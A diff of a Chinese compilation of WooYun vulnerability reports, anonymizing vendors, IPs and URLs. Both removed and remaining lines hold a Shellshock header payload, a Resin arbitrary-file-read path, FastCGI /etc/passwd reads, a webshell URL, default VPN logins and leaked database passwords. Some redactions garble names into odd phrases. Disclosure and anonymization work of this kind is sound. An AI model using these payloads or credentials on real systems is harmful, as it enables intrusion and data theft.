 **POC**: 没人管这个网站么？都别url跳转了～最后我要说的是来一发邀请码吧这次够图文并茂了吧还过不了请说明why 我可不要高大善的官方版
 
@@ -7366,8 +7366,8 @@
 ---
 
 ---
-### [wooyun-2011-03257] 腾讯邮箱服务器允许源地址欺骗漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-03257] 某互联网公司邮箱服务器允许源地址欺骗漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -7378,9 +7378,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯邮箱服务器允许源地址欺骗漏洞,可任意伪造邮箱地址利用腾讯的邮箱服务器来进行发信,造成信任源乱用。例如从邮箱服务器利用马化腾的邮箱给其他任意人发送"精心构造的邮箱内容"。此漏洞只能relay到内部邮箱,发送外部的话会出现554 5.7.1 <cnbird1999@163.com>: Relay access denied
+**详情**: 某互联网公司邮箱服务器允许源地址欺骗漏洞,可任意伪造邮箱地址利用某互联网公司的邮箱服务器来进行发信,造成信任源乱用。例如从邮箱服务器利用马化腾的邮箱给其他任意人发送"精心构造的邮箱内容"。此漏洞只能relay到内部邮箱,发送外部的话会出现554 5.7.1 <cnbird1999@163.com>: Relay access denied
 
-**POC**: 腾讯邮箱服务器允许源地址欺骗漏洞,可任意伪造邮箱地址利用腾讯的邮箱服务器来进行发信,造成信任源乱用。
+**POC**: 某互联网公司邮箱服务器允许源地址欺骗漏洞,可任意伪造邮箱地址利用某互联网公司的邮箱服务器来进行发信,造成信任源乱用。
 
 **绕过**: 直接利用
 
@@ -7422,9 +7422,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址：http://test.hotemall.com/test.tar.gz
+**详情**: 漏洞地址：https://example.com/[已脱敏]
 
-**POC**: 漏洞地址：http://test.hotemall.com/test.tar.gz
+**POC**: 漏洞地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7446,7 +7446,7 @@
 
 **详情**: 配置不当，导致文件读取
 
-**POC**: http://ekey.10010.com/resin-doc/viewfile/?file=index.jsphttp://www.9liao.com/resin-doc/viewfile/Resin-doc/viewfile/?contextpath=c:\windows\repair\&servletpath=&file=sam配置不当，导致文件读取
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7476,8 +7476,8 @@
 ---
 
 ---
-### [wooyun-2011-02924] 腾讯房产频道后台泄露
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 应用配置错误
+### [wooyun-2011-02924] 某互联网公司房产频道后台泄露
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -7488,9 +7488,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯房产频道后台泄露http://db.cs.house.qq.com/admin/error/no_privilege.htm
+**详情**: 某互联网公司房产频道后台泄露https://example.com/[已脱敏]
 
-**POC**: 腾讯房产频道后台泄露http://db.cs.house.qq.com/admin/error/no_privilege.htm
+**POC**: 某互联网公司房产频道后台泄露https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7532,7 +7532,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: rails.com.cn存在域传送漏洞，> ls -d rails.com.cn[dns.rails.com.cn]rails.com.cn.                  SOA    ns.rails.com.cn root.rails.com.cn. (1997022700 28800 14400 3600000 86400)rails.com.cn.                  NS     ns.rails.com.cnrails.com.cn.                  MX     134  ems.rails.com.cn6c                             A      114.255.140.174alumni                         A      61.237.239.211bswb          
+**详情**: rails.com.cn存在域传送漏洞，> ls -d rails.com.cn[dns.rails.com.cn]rails.com.cn.                  SOA    ns.rails.com.cn root.rails.com.cn. (1997022700 28800 14400 3600000 86400)rails.com.cn.                  NS     ns.rails.com.cnrails.com.cn.                  MX     134  ems.rails.com.cn6c                             A      [IP已脱敏]alumni                         A      [IP已脱敏]bswb          
 
 **POC**: (见原文)
 
@@ -7556,7 +7556,7 @@
 
 **详情**: 
 
-**POC**: http://m.sxxz.gov.cn/login.phphttp://m.sxxz.gov.cn/reg.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7598,7 +7598,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站名称： 明道网站域名： mingdao.com主办单位名称： 上海梅花信息有限公司站点：http://blog.mingdao.com/python脚本跑出用户  burp小爆破一把  搞定：密码太弱了。。权限很大ok 服务器什么就不深入了
+**详情**: 网站名称： 明道网站域名： mingdao.com主办单位名称： 上海梅花信息有限公司站点：https://example.com/[已脱敏]  burp小爆破一把  搞定：密码太弱了。。权限很大ok 服务器什么就不深入了
 
 **POC**: 如上
 
@@ -7609,7 +7609,7 @@
 
 ---
 ### [wooyun-2011-03011] 贵州联通机房重要资料泄漏
-**厂商**: 中国联通 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -7642,13 +7642,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 61.152.115.150 Mongodb 配置不当
+**详情**: [IP已脱敏] Mongodb 配置不当
 
 **POC**: 208个 collection，算是目前见到的最多的了。如果是 heavy user，犯这种错误有点不太应该啊。
 
 **绕过**: 直接利用
 
-**修复**: 参见 MongoDB安全配置http://drops.wooyun.org/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/2470
+**修复**: 参见 MongoDB安全配置https://example.com/[已脱敏]
 ---
 
 ---
@@ -7664,7 +7664,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百付天下http://www.bypay.cn/  冒死很牛X。国内第一家联合中国银联及电信运营商共同推出基于SIM卡的移动支付产品国内第一家推出基于中国银联无卡支付系统的移动支付产品国内第一家推出一线通模式（兼容回呼模式）的语音支付产品国内第一家推出兼容信用卡和借记卡的跨行托收产品国内第一家推出基于银行卡的电子票券营销整体解决方案中国银联WAP支付产品的唯一承建方中国银联９５５１６短信充值支付的唯一承建方和独家合作伙伴DNS传送漏洞：C:\Documents and Settings\Administrator>nslookupDefault Server:  hb-cache1Address:  61.234.145.101> set type=ns> bypay.cnServer:  hb-cache1Address:  61.234.145.101Non-authoritative
+**详情**: 百付天下https://example.com/[已脱敏]  冒死很牛X。国内第一家联合中国银联及电信运营商共同推出基于SIM卡的移动支付产品国内第一家推出基于中国银联无卡支付系统的移动支付产品国内第一家推出一线通模式（兼容回呼模式）的语音支付产品国内第一家推出兼容信用卡和借记卡的跨行托收产品国内第一家推出基于银行卡的电子票券营销整体解决方案中国银联WAP支付产品的唯一承建方中国银联９５５１６短信充值支付的唯一承建方和独家合作伙伴DNS传送漏洞：C:\Documents and Settings\Administrator>nslookupDefault Server:  hb-cache1Address:  [IP已脱敏]> set type=ns> bypay.cnServer:  hb-cache1Address:  [IP已脱敏]Non-authoritative
 
 **POC**: 如上
 
@@ -7674,8 +7674,8 @@
 ---
 
 ---
-### [wooyun-2012-05908] 京东奢侈品商城解析漏洞
-**厂商**: 京东商城 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-05908] 某电商平台奢侈品商城解析漏洞
+**厂商**: 某电商平台商城 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -7696,8 +7696,8 @@
 ---
 
 ---
-### [wooyun-2015-0154160] 中国移动某分站服务配置不当导致客户信息泄密
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0154160] 某运营商某分站服务配置不当导致客户信息泄密
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -7776,7 +7776,7 @@
 
 **详情**: 国家电网某省电力公司某系统由于配置不当存导致漏洞。
 
-**POC**: 1.国家电网江苏电力http://218.4.146.122/bzgl/login.asp2.漏洞小集合站点目录遍历：任意文件读取下载，这里可以读取站点上部署的相关应用的配置文件以及数据库等信息：数据库配置信息泄漏表字段信息泄漏FTP匿名登录，举两个例子：问题确实存在，尽快修复吧。
+**POC**: 1.国家电网江苏电力http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -7818,7 +7818,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞Url:http://www.test.sfn.com.cn/index.php/admin/office  j719j**     j*****lao***  84******帐户密码我都加密一下，就不放上了。。密码都是这么简单的。就不要上了。。我得到一个口令进入了后台。然后利用这个后台。拿到所有帐户的密码。。。。抓到了MD5,去破解都能破解开的。。。。。由于太敏感了,没有暴露很多东西。。。。。加强对对密码的控制，。验证机制也有问题。可导致暴力猜解、。
+**详情**: 漏洞Url:https://example.com/[已脱敏]  j719j**     j*****lao***  84******帐户密码我都加密一下，就不放上了。。密码都是这么简单的。就不要上了。。我得到一个口令进入了后台。然后利用这个后台。拿到所有帐户的密码。。。。抓到了MD5,去破解都能破解开的。。。。。由于太敏感了,没有暴露很多东西。。。。。加强对对密码的控制，。验证机制也有问题。可导致暴力猜解、。
 
 **POC**: (见原文)
 
@@ -7840,7 +7840,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ssltest.py 115.236.50.9
+**详情**: ssltest.py [IP已脱敏]
 
 **POC**: (见原文)
 
@@ -7864,7 +7864,7 @@
 
 **详情**: SECCN VPN系列产品存在默认管理员admin/888888和guest用户seccn2012/seccn2012，且系统配置文件采用base64编码，可以直接查看VPN用户密码用于连接VPN线路
 
-**POC**: 利用百度获取案例site:**.**.**.**http://gt1406043.**.**.**.**:10000/  seccn2012/seccn2012http://gs1402096.**.**.**.**:10000/ admin/888888http://gt1504238.**.**.**.**:10000/ seccn2012/seccn2012http://gt1504345.**.**.**.**:10000/ admin/888888http://gt1501031.**.**.**.**:10000/ seccn2012/seccn2012http://gt13122
+**POC**: 利用某搜索引擎获取案例site:**.**.**.**http://gt1406043.**.**.**.**:10000/  seccn2012/seccn2012http://gs1402096.**.**.**.**:10000/ admin/888888http://gt1504238.**.**.**.**:10000/ seccn2012/seccn2012http://gt1504345.**.**.**.**:10000/ admin/888888http://gt1501031.**.**.**.**:10000/ seccn2012/seccn2012http://gt13122
 
 **绕过**: 编码绕过
 
@@ -7884,7 +7884,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 大概是宾馆网络出了问题，正在播放的节目缓冲失败了。于是屏幕报错如下：找不到网页：http://118.1xx.xxx.11/iPG/T-nsp/VodPlay.do?svstype=packd&pmId=0&mainPmId=179***&userId=16669***温馨提示，此链接好像已损坏。访问这个连接，就能看到成都市普通家庭数字电视开机后的熟悉的画面。
+**详情**: 大概是宾馆网络出了问题，正在播放的节目缓冲失败了。于是屏幕报错如下：找不到网页：https://example.com/[已脱敏]
 
 **POC**: 手工查看了下，存在两个大问题：1.jmx-console后台无需认证直接访问，后果大家都知道的。。。2.iEPG系统弱口令，admin/admin。可查看数字电视相关敏感信息，能否修改套餐或更换节目深入测试了才知道。花点时间应该没问题的。
 
@@ -7950,7 +7950,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.mynj.gov.cn/jmx-console/
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7972,13 +7972,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: （图片好像泄漏了什么）cdb.com.cn和cdb.cn有MX记录，说明@cdb.com.cn和@cdb.cn用于发邮件但是cdb.com.cn和cdb.cn域名的DNS记录没有txt类型的spf记录登记邮件服务器IP，可伪造*@cdb.com.cn和*@cdb.cn发邮件cdb.cn域名所有者联系邮箱wangyifan@cdb.com.cnhttp://www.cdb.com.cn/web/Column.asp?ColumnId=18管理员邮箱：webmaster@cdb.cn再次说明@cdb.com.cn和@cdb.cn用于发邮件
+**详情**: （图片好像泄漏了什么）cdb.com.cn和cdb.cn有MX记录，说明@cdb.com.cn和@cdb.cn用于发邮件但是cdb.com.cn和cdb.cn域名的DNS记录没有txt类型的spf记录登记邮件服务器IP，可伪造*@cdb.com.cn和*@cdb.cn发邮件cdb.cn域名所有者联系邮箱wangyifan@cdb.com.cnhttps://example.com/[已脱敏]
 
 **POC**: 伪造wangyifan@cdb.com.cn搭建一个邮局服务器添加域名cdb.com.cn添加用户wangyifan发邮件（给自己）（图片貌似泄漏了什么）同理可证伪造webmaster@cdb.cn
 
 **绕过**: 直接利用
 
-**修复**: 求礼物~~送礼物后可以看到修复方案域名的DNS记录添加txt类型的spf记录登记邮件服务器IP可以参考qq.com、163.com、baidu.com等域名spf记录登记邮件服务器的IP地址造成影响：高影响范围：大攻击成本：低
+**修复**: 求礼物~~送礼物后可以看到修复方案域名的DNS记录添加txt类型的spf记录登记邮件服务器IP可以参考某互联网公司.com、163.com、baidu.com等域名spf记录登记邮件服务器的IP地址造成影响：高影响范围：大攻击成本：低
 ---
 
 ---
@@ -7994,7 +7994,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://oldweb.lib.sjtu.edu.cn/sjtu.tar.gz里面含有mysql数据库账号密码。还有整站源代码
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8016,7 +8016,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://hi.baidu.com/virtualdevil/blog/item/564b9cce551a4e20f9dc6117.html
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 发现同一个网段内其他网站存在SQL注入，上传，后台泄漏.C段嗅探.
 
@@ -8027,7 +8027,7 @@
 
 ---
 ### [wooyun-2013-017982] 浙江电信某应用服务器爆JBoss配置漏洞
-**厂商**: 中国电信 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 后台管理
 
@@ -8040,7 +8040,7 @@
 
 **详情**: JBOSS默认配置会有一个后台漏洞，漏洞发生在jboss.deployment命名空间中的addURL()函数,该函数可以远程下载一个war压缩包并解压
 
-**POC**: 某人某日某时某分，闲来无事，google hacking（不上图了）某页某条找到http://60.190.245.146:8082/jmx-console/，遂访问之~在某条选项中打开，发现已经有人先我一步（痛恨死Ta了）虽然成就感全无，但咱还是正义一把，把漏洞提交了吧，以免后患~~~JSP马已经上去了，具体能做什么，这个我就不再赘述了
+**POC**: 某人某日某时某分，闲来无事，google hacking（不上图了）某页某条找到http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -8104,7 +8104,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://gamemanager.uqee.com/baidu baidu可控制三款游戏可对玩家进行礼品卡发放可进行全服进行礼品卡发放第二款游戏 木叶传说查询玩家角色名可 登陆，禁言 冻结第三款游戏 梦回江湖
+**详情**: https://example.com/[已脱敏] baidu可控制三款游戏可对玩家进行礼品卡发放可进行全服进行礼品卡发放第二款游戏 木叶传说查询玩家角色名可 登陆，禁言 冻结第三款游戏 梦回江湖
 
 **POC**: (见原文)
 
@@ -8148,9 +8148,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 还是fastcgi对外的问题额，发了吧[root@localhost FastCGI]# /usr/local/php/bin/php fcgiget.php 113.106.100.82:9000/etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/b
+**详情**: 还是fastcgi对外的问题额，发了吧[root@localhost FastCGI]# /usr/local/php/bin/php fcgiget.php [IP已脱敏]
 
-**POC**: [root@localhost FastCGI]# /usr/local/php/bin/php fcgiget.php 113.106.100.82:9000/etc/hostsX-Powered-By: PHP/5.2.6-3ubuntu4.6Content-type: text/html127.0.0.1	localhost127.0.1.1	kickseed# The following lines are desirable for IPv6 capable hosts::1     localhost ip6-localhost ip6-loopbackfe00::0 ip6-lo
+**POC**: [root@localhost FastCGI]# /usr/local/php/bin/php fcgiget.php [IP已脱敏] PHP/5.2.6-3ubuntu4.6Content-type: text/html127.0.0.1	localhost127.0.1.1	kickseed# The following lines are desirable for IPv6 capable hosts::1     localhost ip6-localhost ip6-loopbackfe00::0 ip6-lo
 
 **绕过**: 直接利用
 
@@ -8192,7 +8192,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 哈尔滨市商务局http://www.hrbcb.gov.cn//test.txt
+**详情**: 哈尔滨市商务局https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8236,7 +8236,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 直接探测http://www.sjzszlxx.comOPTIONS / HTTP/1.1Host: www.sjzszlxx.comHTTP/1.1 200 OKDate: Thu, 13 Jun 2013 04:37:02 GMTServer: Microsoft-IIS/6.0MicrosoftOfficeWebServer: 5.0_PubX-Powered-By: ASP.NETMS-Author-Via: MS-FP/4.0,DAVContent-Length: 0Accept-Ranges: noneDASL: <DAV:sql>DAV: 1, 2Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCHAl
+**详情**: 直接探测https://example.com/[已脱敏] / HTTP/1.1Host: www.sjzszlxx.comHTTP/1.1 200 OKDate: Thu, 13 Jun 2013 04:37:02 GMTServer: Microsoft-IIS/6.0MicrosoftOfficeWebServer: 5.0_PubX-Powered-By: ASP.NETMS-Author-Via: MS-FP/4.0,DAVContent-Length: 0Accept-Ranges: noneDASL: <DAV:sql>DAV: 1, 2Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCHAl
 
 **POC**: (见原文)
 
@@ -8258,7 +8258,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 郑州银行http://www.zzbank.cnDomain Name: zzbank.cnROID: 20080521s10001s85568180-cnDomain Status: clientDeleteProhibitedDomain Status: clientTransferProhibitedRegistrant ID: ename_62n2eeod7vRegistrant: 郑州银行股份有限公司Registrant Contact Email: hanbaohong@gmail.comSponsoring Registrar: 厦门易名科技有限公司（原厦门易名网络科技有限公司）Name Server: dns1.iidns.comName Server: dns2.iidns.comName Server: dns3.iidns.comName Server: dns4.i
+**详情**: 郑州银行https://example.com/[已脱敏] Name: zzbank.cnROID: 20080521s10001s85568180-cnDomain Status: clientDeleteProhibitedDomain Status: clientTransferProhibitedRegistrant ID: ename_62n2eeod7vRegistrant: 郑州银行股份有限公司Registrant Contact Email: hanbaohong@gmail.comSponsoring Registrar: 厦门易名科技有限公司（原厦门易名网络科技有限公司）Name Server: dns1.iidns.comName Server: dns2.iidns.comName Server: dns3.iidns.comName Server: dns4.i
 
 **POC**: ···
 
@@ -8304,7 +8304,7 @@
 
 **详情**: tom站可能是用户比较少了，无人问津程序问题多多
 
-**POC**: http://popupadmin.nba.tom.com/users/loginhttp://tag.ad.tom.com/http://f.game.tom.com/admin.phphttp://admin.cmail.tom.com/index.jsphttp://game.tom.com/administrator/login.htmlhttp://vote2.ent.tom.com/http://webi.tom.com/admin_login.phphttp://bbs.tom.com/manage/login.php?4270432867=3678211666http://ga
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8348,7 +8348,7 @@
 
 **详情**: CENTOS 自带的Apache配置不当导致列目录文件遍历。
 
-**POC**: http://image.help.sdo.com/core
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8368,9 +8368,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://219.129.189.12/
+**详情**: http://[IP已脱敏]
 
-**POC**: shell地址：http://219.129.189.12/shell.asp;1.jpg （请删除）
+**POC**: shell地址：http://[IP已脱敏] （请删除）
 
 **绕过**: 直接利用
 
@@ -8390,9 +8390,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://61.156.3.10/experience/
+**详情**: http://[IP已脱敏]
 
-**POC**: http://61.156.3.10/experience/
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -8436,7 +8436,7 @@
 
 **详情**: IT168某子站备份源玛导致查看web.config.知道密码帐号.直接登陆数据库
 
-**POC**: http://adshow.it168.com/adnew.rar<add key="adshow" value="server=58.83.162.9,1681;database=adshow;uid=User_App_adshow;pwd=385A3857F7d456;"/><!--<add key="adshow" value="server=10.10.11.12,1681;database=adshow;uid=User_App_adshow;pwd=B8oU2w1B29i6SRD;"/>--><add key="xmlpath" value="xml//ADUser.xml"/><
+**POC**: https://example.com/[已脱敏] key="adshow" value="server=[IP已脱敏],1681;database=adshow;uid=User_App_adshow;pwd=385A3857F7d456;"/><!--<add key="adshow" value="server=[IP已脱敏],1681;database=adshow;uid=User_App_adshow;pwd=B8oU2w1B29i6SRD;"/>--><add key="xmlpath" value="xml//ADUser.xml"/><
 
 **绕过**: 直接利用
 
@@ -8456,7 +8456,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://101.251.233.156:9200/_search?preetyhttp://101.251.233.156:9200/_nodeshttp://101.251.233.156:9200/_plugin/head/
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -8480,7 +8480,7 @@
 
 **详情**: 
 
-**POC**: C:\Python27>iis_shortname_Scan.py http://idea.beisen.com/server is vulerable, please wait, scanning...Found /a****    [scan in progress]Found /g****    [scan in progress]Found /p****    [scan in progress]Found /w****    [scan in progress]Found /as****   [scan in progress]Found /gl****   [scan in pro
+**POC**: C:\Python27>iis_shortname_Scan.py https://example.com/[已脱敏] is vulerable, please wait, scanning...Found /a****    [scan in progress]Found /g****    [scan in progress]Found /p****    [scan in progress]Found /w****    [scan in progress]Found /as****   [scan in progress]Found /gl****   [scan in pro
 
 **绕过**: 直接利用
 
@@ -8506,7 +8506,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 1法 限制文件夹权限，若为静态资源文件夹就不做php解析。2法 升级nginx自己百度...
+**修复**: 1法 限制文件夹权限，若为静态资源文件夹就不做php解析。2法 升级nginx自己某搜索引擎...
 ---
 
 ---
@@ -8522,7 +8522,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://dzhouse.dzwww.com//WEB-INF/classes/log4j.propertieshttp://dzhouse.dzwww.com/WEB-INF/web.xmlhttp://dzhouse.dzwww.com//WEB-INF/struts-confi
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8546,7 +8546,7 @@
 
 **详情**: 要是我每天都通知运维运维不烦死.
 
-**POC**: 地址：http://monitor2.aipai.com:8988还把运维的姓名手机号给泄露了.还来个遍历.
+**POC**: 地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8576,7 +8576,7 @@
 ---
 
 ---
-### [wooyun-2012-06845] Discuz云平台QQ互联接口问题
+### [wooyun-2012-06845] Discuz云平台某互联网公司互联接口问题
 **厂商**: Discuz! | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
@@ -8588,7 +8588,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Discuz云平台QQ互联接口存在问题，导致用户在开通QQ联通的时候会爆出云平台的路径地址。
+**详情**: Discuz云平台某互联网公司互联接口存在问题，导致用户在开通某互联网公司联通的时候会爆出云平台的路径地址。
 
 **POC**: (见原文)
 
@@ -8632,9 +8632,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 迅雷某后台泄露http://xlapp.xunlei.com:8081/plaf/login.jsf
+**详情**: 迅雷某后台泄露https://example.com/[已脱敏]
 
-**POC**: 迅雷某后台泄露http://xlapp.xunlei.com:8081/plaf/login.jsf
+**POC**: 迅雷某后台泄露https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8660,7 +8660,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 我现在的感受就是非常难过非常低迷我在考虑是不是不当白帽子了根本就完全当不下去了我不相信你们的公关人员！请技术人员找我！谢谢！QQ:681796
+**修复**: 我现在的感受就是非常难过非常低迷我在考虑是不是不当白帽子了根本就完全当不下去了我不相信你们的公关人员！请技术人员找我！谢谢！某互联网公司:681796
 ---
 
 ---
@@ -8700,7 +8700,7 @@
 
 **详情**: 整站源码整站打包！只是发现了整站源码，不深入，我只是拿几分而已！
 
-**POC**: http://lexue.tcl.com/LearnSite/LearnSite.rar
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8730,7 +8730,7 @@
 ---
 
 ---
-### [wooyun-2015-0117583] 海尔微信平台配置错误
+### [wooyun-2015-0117583] 海尔某互联网公司平台配置错误
 **厂商**: 海尔集团 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
@@ -8742,7 +8742,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://rmp.haier.net/admin/
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8764,7 +8764,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://61.178.48.15/甘肃省就业失业登记系统http://61.178.48.15/test.txt
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -8786,7 +8786,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://channel.chinanews.com/resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsphttp://photolib.chinanews.com/resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsphttp://sou.chinanews.com/resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsp
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8814,7 +8814,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 禁止上传目录 运行PHP的权限等。不懂？请百度
+**修复**: 禁止上传目录 运行PHP的权限等。不懂？请某搜索引擎
 ---
 
 ---
@@ -8830,7 +8830,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 客音呼叫中心http://125.93.53.88/jmx-console/后面两个不知道什么原因现在访问不了http://125.93.53.88/jmx-console/http://125.93.53.81:8081/jmx-console/
+**详情**: 客音呼叫中心http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -8852,7 +8852,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主要还是rsync配置不当，泄漏了大量的核心源码，而且还是最近几天的：ip : 121.14.241.86api.39.net的核心源码还有好几个站点的。不一一列举
+**详情**: 主要还是rsync配置不当，泄漏了大量的核心源码，而且还是最近几天的：ip : [IP已脱敏]api.39.net的核心源码还有好几个站点的。不一一列举
 
 **POC**: (见原文)
 
@@ -8918,7 +8918,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.Fckeditor编辑器漏洞话说，2011年某月某日，入手的域名快到期了，于是登陆新网准备续费，貌似网站刚改版，手贱看了下banner图片链接http://hymanage.xinnet.com/club/adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1318226996487.jpg，习惯性地扫了下目录，爆出fckeditor编辑器，于是，各种漏洞一阵轰炸，发现可以遍历目录http://hymanage.xinnet.com/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../换了下主站的域名，发现也能列目录http://ww
+**详情**: 1.Fckeditor编辑器漏洞话说，2011年某月某日，入手的域名快到期了，于是登陆新网准备续费，貌似网站刚改版，手贱看了下banner图片链接https://example.com/[已脱敏]
 
 **POC**: 分站列目录主站列目录主站源码DNS运营系统Struts漏洞图1DNS运营系统Struts漏洞图2DNS运营系统Struts漏洞图3DNS运营系统源码DNS运营系统管理用户
 
@@ -9006,9 +9006,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 都新的一年了。快修修吧！http://119.254.70.180/ 这台存在bash漏洞GET /cgi-bin/test-cgi HTTP/1.1漏洞 http://wooyun.org/bugs/wooyun-2015-0106070  感谢万能的路人甲Host: 119.254.70.180Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: () { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id;Accept-Encoding: gzip, deflate, sdchAccept-Language: 
+**详情**: 都新的一年了。快修修吧！http://[IP已脱敏] 这台存在bash漏洞GET /cgi-bin/test-cgi HTTP/1.1漏洞 https://example.com/[已脱敏]  感谢万能的路人甲Host: [IP已脱敏]Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: () { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id;Accept-Encoding: gzip, deflate, sdchAccept-Language: 
 
-**POC**: 看下/etc/hosts写个shell什么的也很简单http://119.254.70.180/test.php好了 不继续了
+**POC**: 看下/etc/hosts写个shell什么的也很简单http://[IP已脱敏] 不继续了
 
 **绕过**: 直接利用
 
@@ -9028,9 +9028,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://product.enet.com.cn/price/%3f.jsp涉及目录比较多，以此为例
+**详情**: https://example.com/[已脱敏]
 
